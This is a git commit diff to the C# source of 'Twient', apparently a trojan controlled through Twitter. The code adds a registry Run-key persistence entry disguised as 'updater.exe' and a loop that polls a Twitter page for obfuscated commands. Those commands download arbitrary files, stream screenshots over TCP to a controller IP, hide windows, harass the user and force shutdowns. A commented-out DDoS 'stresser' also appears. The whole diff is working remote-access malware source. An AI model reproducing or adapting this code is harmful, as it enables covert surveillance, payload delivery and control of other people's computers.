7200f4bcddc7c78941607ab65360ef2fa5f0be95
Voraka <voraka@163.com>
2017-06-08 18:29:45 +0800

    update

--- Twient/Twient/Program.cs
+++ Twient/Twient/Program.cs
@@ -117,172 +117,166 @@ namespace Twient
             rk2.SetValue("updater", GlobalVars.Backpath + "\\updater.exe");
             rk2.Close();
             rk.Close();
-			//RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-			//registryKey.SetValue("updater", GlobalVars.Backpath + "\\updater.exe");
-			//registryKey.Close();
+			
 		}
 		
 		private static void read_cmd()
 		{
+			string last_key = "";
 			while (true)
 			{
 				string key = "";
 				string filepath =System.Windows.Forms.Application.ExecutablePath;			
 				string strSource = readtwitter();
-				string msg = Decode(Decode(Decode(getBetween(strSource, Encode(Encode(Encode("COMMAND"))), Encode(Encode(Encode("COMMAND_END")))))));
-				//string between = getBetween(strSource, "COMMAND", "COMMAND_END");
-				//Console.WriteLine(a);
-				Regex regex = new Regex("-CUT-");
+				string msg = Decode(Decode(Decode(getBetween(strSource, Encode(Encode(Encode("cmd1"))), Encode(Encode(Encode("cmd2")))))));				
+				Regex regex = new Regex("--");
 				string[] cut = regex.Split(msg);
 				key = cut[0];
 				
 				if (key=="")
 				{
+					MessageBox.Show("No key", "Error");
 					Functions.SetCritical(0);
 					Environment.Exit(0);
 				}
 				//panic(filepath);			
 				
-				if (cut!=GlobalVars.cmds)
+				if (key!=last_key)
 				{
-					GlobalVars.cmds = cut;
-				}
-				else
-					break;
-				 
-				switch (key)
-				{
-					case "crasher":
+					last_key = key;				
+					switch (key)
+					{
+						case "crasher":
+							{
+								//Console.WriteLine("\t hit crasher");
+								break;
+							}
+						
+						
+						case "Crazymouse":
 						{
-							//Console.WriteLine("\t hit crasher");
+							//Console.WriteLine("Crazymouse");
+		//					Thread thread6 = new Thread(delegate
+		//					{
+		//						Functions.CrazyMouse((int)Convert.ToInt16(cut[1]));
+		//					});
+		//					thread6.Start();							
+							Functions.CrazyMouse((int)Convert.ToInt16(cut[1]));
 							break;
 						}
-					
-					
-					case "Crazymouse":
-					{
-						//Console.WriteLine("Crazymouse");
-	//					Thread thread6 = new Thread(delegate
-	//					{
-	//						Functions.CrazyMouse((int)Convert.ToInt16(cut[1]));
-	//					});
-	//					thread6.Start();							
-						Functions.CrazyMouse((int)Convert.ToInt16(cut[1]));
-						break;
-					}
-					
-					case "Download":
-					{
-						//Console.WriteLine("Download");
-						WebClient webClient = new WebClient();
-						webClient.DownloadFile(cut[1], cut[2]);
-						break;
-					}	
-					
-					case "Windowtitle":
-					{
-						//Console.WriteLine("Windowtitle");
-						IntPtr foregroundWindow2 = Functions.GetForegroundWindow();
-						Functions.SetWindowText(foregroundWindow2, cut[1]);
-						break;
-					}	
 						
-					case "StressStart":
-					{
-						//Console.WriteLine("StressStart");
-	//					Stresser.Host = cut[1];
-	//					Stresser.Port = int.Parse(cut[2]);
-	//					Stresser.Threads = int.Parse(cut[3]);
-	//					Stresser.Type = cut[4];
-	//					if (Stresser.Type.StartsWith("HTTP") || Stresser.Type.StartsWith("SLOW"))
-	//					{
-	//						Stresser.Page = cut[5];
-	//					}
-	//					Stresser.IsStressing = true;
-	//					Stresser.Start();
-						
-						break;
-					}	
-						
-					case "Hidewindow":
-					{
-						//Console.WriteLine("Hidewindow");
-						
-						IntPtr foregroundWindow = Functions.GetForegroundWindow();
-						Functions.ShowWindow(foregroundWindow, 0);					
-						break;
-					}	
-						
-					case "MessageBox":
-					{
-						MessageBoxIcon icon = MessageBoxIcon.Hand;
-						MessageBoxButtons button = MessageBoxButtons.OK;
-						Functions.MsgBox(cut[1], cut[2], icon, button);	
-						break;
-					}
-						
-					case "CaptureDesktop":
-					{
-						Rectangle rectangle = default(Rectangle);
-						rectangle = Screen.PrimaryScreen.Bounds;
-						Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
-						Graphics graphics = Graphics.FromImage(bitmap);
-						graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
-											
-						try
+						case "Download":
 						{
-							TcpClient tcpClient = new TcpClient(GlobalVars.DesktopIP, 1234);
-							BinaryFormatter binaryFormatter = new BinaryFormatter();
-							using (NetworkStream stream = tcpClient.GetStream())
+							//Console.WriteLine("Download");
+							WebClient webClient = new WebClient();
+							webClient.DownloadFile(cut[1], cut[2]);
+							break;
+						}	
+						
+						case "Windowtitle":
+						{
+							//Console.WriteLine("Windowtitle");
+							IntPtr foregroundWindow2 = Functions.GetForegroundWindow();
+							Functions.SetWindowText(foregroundWindow2, cut[1]);
+							break;
+						}	
+							
+						case "StressStart":
+						{
+							//Console.WriteLine("StressStart");
+		//					Stresser.Host = cut[1];
+		//					Stresser.Port = int.Parse(cut[2]);
+		//					Stresser.Threads = int.Parse(cut[3]);
+		//					Stresser.Type = cut[4];
+		//					if (Stresser.Type.StartsWith("HTTP") || Stresser.Type.StartsWith("SLOW"))
+		//					{
+		//						Stresser.Page = cut[5];
+		//					}
+		//					Stresser.IsStressing = true;
+		//					Stresser.Start();
+							
+							break;
+						}	
+							
+						case "Hidewindow":
+						{
+							//Console.WriteLine("Hidewindow");
+							
+							IntPtr foregroundWindow = Functions.GetForegroundWindow();
+							Functions.ShowWindow(foregroundWindow, 0);					
+							break;
+						}	
+							
+						case "MessageBox":
+						{
+							MessageBoxIcon icon = MessageBoxIcon.Hand;
+							MessageBoxButtons button = MessageBoxButtons.OK;
+							Functions.MsgBox(cut[1], cut[2], icon, button);	
+							break;
+						}
+							
+						case "CaptureDesktop":
+						{
+							Rectangle rectangle = default(Rectangle);
+							rectangle = Screen.PrimaryScreen.Bounds;
+							Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height, PixelFormat.Format32bppArgb);
+							Graphics graphics = Graphics.FromImage(bitmap);
+							graphics.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, CopyPixelOperation.SourceCopy);
+												
+							try
 							{
-								while (true)
+								TcpClient tcpClient = new TcpClient(GlobalVars.DesktopIP, 1234);
+								BinaryFormatter binaryFormatter = new BinaryFormatter();
+								using (NetworkStream stream = tcpClient.GetStream())
 								{
-									binaryFormatter.Serialize(stream, bitmap);
-									Thread.Sleep(1);
+									while (true)
+									{
+										binaryFormatter.Serialize(stream, bitmap);
+										Thread.Sleep(1);
+									}
 								}
 							}
-						}
-						catch
+							catch
+							{
+							}
+							
+							break;
+						}	
+							
+						case "Swapmousebuttons_on":
 						{
+							Functions.SwapMouseButton(1);
+							break;
+						}
+							
+						case "Swapmousebuttons_off":
+						{
+							Functions.SwapMouseButton(0);
+							break;
 						}
 						
-						break;
-					}	
+						case "Beeper_Bomb":
+						{					
+							Thread thread5 = new Thread(new ThreadStart(Functions.Beeper_bomb));
+							thread5.Start();
+							break;
+						}
+							
+						case "Restart":
+						{					
+							Functions.Shutdown(2);
+							break;
+						}	
 						
-					case "Swapmousebuttons_on":
-					{
-						Functions.SwapMouseButton(1);
-						break;
+						case "Shutdown":
+						{					
+							Functions.Shutdown(1);
+							break;
+						}	
+							
 					}
-						
-					case "Swapmousebuttons_off":
-					{
-						Functions.SwapMouseButton(0);
-						break;
-					}
-					
-					case "Beeper_Bomb":
-					{					
-						Thread thread5 = new Thread(new ThreadStart(Functions.Beeper_bomb));
-						thread5.Start();
-						break;
-					}
-						
-					case "Restart":
-					{					
-						Functions.Shutdown(2);
-						break;
-					}	
-					
-					case "Shutdown":
-					{					
-						Functions.Shutdown(1);
-						break;
-					}	
-						
+			
 				}
-			
-			
 								
 				Thread.Sleep(10000);
 			}
